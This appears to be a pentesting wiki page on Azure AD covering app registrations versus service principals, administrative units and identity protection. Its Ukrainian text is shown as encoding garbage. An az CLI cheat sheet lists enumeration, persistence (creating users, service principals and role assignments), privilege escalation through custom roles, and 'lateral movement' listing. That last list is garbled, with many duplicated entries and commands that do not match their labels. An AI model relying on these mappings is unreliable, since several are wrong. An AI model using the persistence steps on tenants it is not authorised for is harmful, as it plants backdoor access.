#### –í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –º—ñ–∂ –î–æ–¥–∞—Ç–∫–∞–º–∏ —Ç–∞ (–ü—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∏–º–∏ –¥–æ–¥–∞—Ç–∫–∞–º–∏ –∞–±–æ –°–ª—É–∂–±–æ–≤–∏–º–∏ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞–º–∏)

–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –º—ñ–∂ –¥–æ–¥–∞—Ç–∫–æ–º —Ç–∞ —Å–ª—É–∂–±–æ–≤–∏–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–æ–º –≤ Azure:

* **–î–æ–¥–∞—Ç–æ–∫/–†–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –¥–æ–¥–∞—Ç–∫—ñ–≤**: –¶–µ –¥–æ–¥–∞—Ç–∫–∏, —è–∫—ñ —ñ—Å–Ω—É—é—Ç—å —É –≤–∞—à–æ–º—É Azure AD
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **–°–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª/–ü—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫—ñ –¥–æ–¥–∞—Ç–∫–∏**: –û–±'—î–∫—Ç–∏ –±–µ–∑–ø–µ–∫–∏ —É –≤–∞—à–æ–º—É Azure AD, —è–∫—ñ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ **–ø—Ä–∏–≤—ñ–ª–µ—ó** –≤ Azure Directory —Ç–∞ –ø–æ–≤'—è–∑–∞–Ω—ñ –∞–±–æ –∑ –≤–∞—à–∏–º –¥–æ–¥–∞—Ç–∫–æ–º, –∞–±–æ –∑ –¥–æ–¥–∞—Ç–∫–æ–º —Å—Ç–æ—Ä–æ–Ω–Ω—å–æ—ó —Å—Ç–æ—Ä–æ–Ω–∏
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ –∑–∞—Ç–≤–µ—Ä–¥–∏—Ç–∏ –Ω–∞–¥–∞–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, —è–∫—â–æ –≤–æ–Ω–∏ —î –¥—É–∂–µ —á—É—Ç–ª–∏–≤–∏–º–∏.

–î–æ–¥–∞—Ç–æ–∫ –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –≤ **–æ—Ä–µ–Ω–¥–∞—Ä—ñ —Å—Ç–æ—Ä–æ–Ω–Ω—å–æ—ó —Å—Ç–æ—Ä–æ–Ω–∏**, —ñ —è–∫ —Ç—ñ–ª—å–∫–∏ –≤–∏ –ø–æ—á–∏–Ω–∞—î—Ç–µ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–∞ –Ω–∞–¥–∞—î—Ç–µ –π–æ–º—É –¥–æ—Å—Ç—É–ø, –≤ –≤–∞—à–æ–º—É –æ—Ä–µ–Ω–¥–∞—Ä—ñ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è **–ü—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫/–°–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª**, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –π–æ–º—É –¥–æ—Å—Ç—É–ø –¥–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó:

#### –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ –æ–¥–∏–Ω–∏—Ü—ñ

–í–æ–Ω–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –∫—Ä–∞—â–æ–≥–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏.

–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ –æ–¥–∏–Ω–∏—Ü—ñ **–æ–±–º–µ–∂—É—é—Ç—å –¥–æ–∑–≤–æ–ª–∏ –≤ —Ä–æ–ª—ñ –Ω–∞ –±—É–¥—å-—è–∫—É —á–∞—Å—Ç–∏–Ω—É –≤–∞—à–æ—ó –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó**, —è–∫—É –≤–∏ –≤–∏–∑–Ω–∞—á–∞—î—Ç–µ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ –æ–¥–∏–Ω–∏—Ü—ñ –¥–ª—è –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è —Ä–æ–ª—ñ [–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —Å–ª—É–∂–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator) —Ä–µ–≥—ñ–æ–Ω–∞–ª—å–Ω–∏–º —Å–ø–µ—Ü—ñ–∞–ª—ñ—Å—Ç–∞–º –∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏, —â–æ–± –≤–æ–Ω–∏ –º–æ–≥–ª–∏ –∫–µ—Ä—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ –ª–∏—à–µ –≤ —Ä–µ–≥—ñ–æ–Ω—ñ, —è–∫–∏–π –≤–æ–Ω–∏ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å.

–û—Ç–∂–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–∑–Ω–∞—á–∞—Ç–∏ —Ä–æ–ª—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –æ–¥–∏–Ω–∏—Ü—ñ, —ñ —á–ª–µ–Ω–∏ —Ü—ñ—î—ó –æ–¥–∏–Ω–∏—Ü—ñ –º–∞—Ç–∏–º—É—Ç—å —Ü—ñ —Ä–æ–ª—ñ.

```
```



#### AzureAD

**Enumeration**

1.  **Get Tenant ID**

    ```bash
    az account show --query tenantId
    ```
2.  **Get Users**

    ```bash
    az ad user list
    ```
3.  **Get Groups**

    ```bash
    az ad group list
    ```
4.  **Get Service Principals**

    ```bash
    az ad sp list
    ```
5.  **Get Applications**

    ```bash
    az ad app list
    ```
6.  **Get Roles**

    ```bash
    az role assignment list
    ```
7.  **Get Subscriptions**

    ```bash
    az account list
    ```

**Persistence**

*   **Add a New User**

    ```bash
    az ad user create --display-name <name> --password <password>
    ```
*   **Add a New Service Principal**

    ```bash
    az ad sp create-for-rbac --name <name>
    ```
*   **Add a New Application**

    ```bash
    az ad app create --display-name <name>
    ```
*   **Add a New Role Assignment**

    ```bash
    az role assignment create --assignee <principalId> --role <role>
    ```

**Privilege Escalation**

*   **Get Role Definitions**

    ```bash
    az role definition list
    ```
*   **Create a Custom Role**

    ```bash
    az role definition create --role-definition <json_file>
    ```
*   **Assign a Custom Role**

    ```bash
    az role assignment create --assignee <principalId> --role <role>
    ```

**Lateral Movement**

*   **List Resource Groups**

    ```bash
    az group list
    ```
*   **List Resources in a Resource Group**

    ```bash
    az resource list -g <resource_group>
    ```
*   **List Virtual Machines**

    ```bash
    az vm list
    ```
*   **List Virtual Machine Scale Sets**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Disks**

    ```bash
    az disk list
    ```
*   **List Virtual Machine Snapshots**

    ```bash
    az snapshot list
    ```
*   **List Virtual Machine Images**

    ```bash
    az image list
    ```
*   **List Virtual Machine Scale Set VMs**

    ```bash
    az vmss list-instances
    ```
*   **List Virtual Machine Scale Set VM Extensions**

    ```bash
    az vmss extension list
    ```
*   **List Virtual Machine Scale Set VM Instance View**

    ```bash
    az vmss get-instance-view
    ```
*   **List Virtual Machine Scale Set VM NICs**

    ```bash
    az vmss nic list
    ```
*   **List Virtual Machine Scale Set VM Public IPs**

    ```bash
    az vmss nic list
    ```
*   **List Virtual Machine Scale Set VM Custom Images**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```
*   **List Virtual Machine Scale Set VM Custom Image Versions**

    ```bash
    az vmss list
    ```

```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```

### –ó–∞—Ö–∏—Å—Ç —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ Azure AD (AIP) <a href="#title-text" id="title-text"></a>

–ó–∞—Ö–∏—Å—Ç —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ Azure AD (AIP) - —Ü–µ —Å–ª—É–∂–±–∞ –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—è –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤ Azure Active Directory –≤—ñ–¥ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó**. AIP –ø–æ—Å—Ç—ñ–π–Ω–æ –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç—å —Ç–∞ –æ—Ü—ñ–Ω—é—î —Ä–∏–∑–∏–∫–∏ —É–≤—ñ—Ö–æ–¥—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ, **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏**, —Ç–∞–∫—ñ —è–∫ –≤–∏–º–æ–≥–∞ –±–∞–≥–∞—Ç–æ—Ñ–∞–∫—Ç–æ—Ä–Ω–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∞–±–æ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏—Ö –¥—ñ–π. –¶–µ –¥–æ–ø–æ–º–∞–≥–∞—î –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—è–º –∑–∞–ø–æ–±—ñ–≥–∞—Ç–∏ –ø–æ—Ä—É—à–µ–Ω–Ω—è–º –±–µ–∑–ø–µ–∫–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ.

–ü–æ—Ç—ñ–∫:

1. –ó–∞—Ö–∏—Å—Ç —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ Azure AD **–º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç—å –¥—ñ—è–ª—å–Ω—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** —Ç–∞ –∑–±–∏—Ä–∞—î –¥–∞–Ω—ñ –ø—Ä–æ **—É–≤—ñ—Ö–æ–¥–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –ø–æ–¥—ñ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** —Ç–∞ —ñ–Ω—à—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ –¥—ñ—ó.
2. –°–ª—É–∂–±–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∞–ª–≥–æ—Ä–∏—Ç–º–∏ –º–∞—à–∏–Ω–Ω–æ–≥–æ –Ω–∞–≤—á–∞–Ω–Ω—è** –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É —Ü–∏—Ö –¥–∞–Ω–∏—Ö —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö –∑–∞–≥—Ä–æ–∑ –±–µ–∑–ø–µ—Ü—ñ.
3. –ó–∞—Ö–∏—Å—Ç —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ Azure AD **–ø—Ä–∏–∑–Ω–∞—á–∞—î —Ä—ñ–≤–µ–Ω—å —Ä–∏–∑–∏–∫—É –∑–∞–≥—Ä–æ–∑–∏** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —É–≤—ñ—Ö—ñ–¥) —Ç–∞ –≥–µ–Ω–µ—Ä—É—î —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è, —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —è–∫—É-–Ω–µ–±—É–¥—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω—É –¥—ñ—é.

### –ó–∞—Ö–∏—Å—Ç –ø–∞—Ä–æ–ª—ñ–≤ Azure AD (APP)

–ó–∞—Ö–∏—Å—Ç –ø–∞—Ä–æ–ª—ñ–≤ Azure AD (APP) - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ **–¥–æ–ø–æ–º–∞–≥–∞—î –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é —Å–ª–∞–±–∫–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤ –≤ Azure Active Directory, –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—á–∏ —Å—Ç—Ä–æ–≥—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –ø–∞—Ä–æ–ª—ñ–≤**. APP –±–ª–æ–∫—É—î **—á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ —Å–ª–∞–±–∫—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ —ó—Ö –≤–∞—Ä—ñ–∞–Ω—Ç–∏, –∑–º–µ–Ω—à—É—é—á–∏ —Ä–∏–∑–∏–∫ –ø–æ—Ä—É—à–µ–Ω—å, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ –ø–∞—Ä–æ–ª—è–º–∏. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ —è–∫ –Ω–∞ —Ä—ñ–≤–Ω—ñ —Ö–º–∞—Ä–∏, —Ç–∞–∫ —ñ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ Active Directory, –ø—ñ–¥–≤–∏—â—É—é—á–∏ –∑–∞–≥–∞–ª—å–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ –ø–∞—Ä–æ–ª—ñ–≤ –≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó.

#### –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

</details>
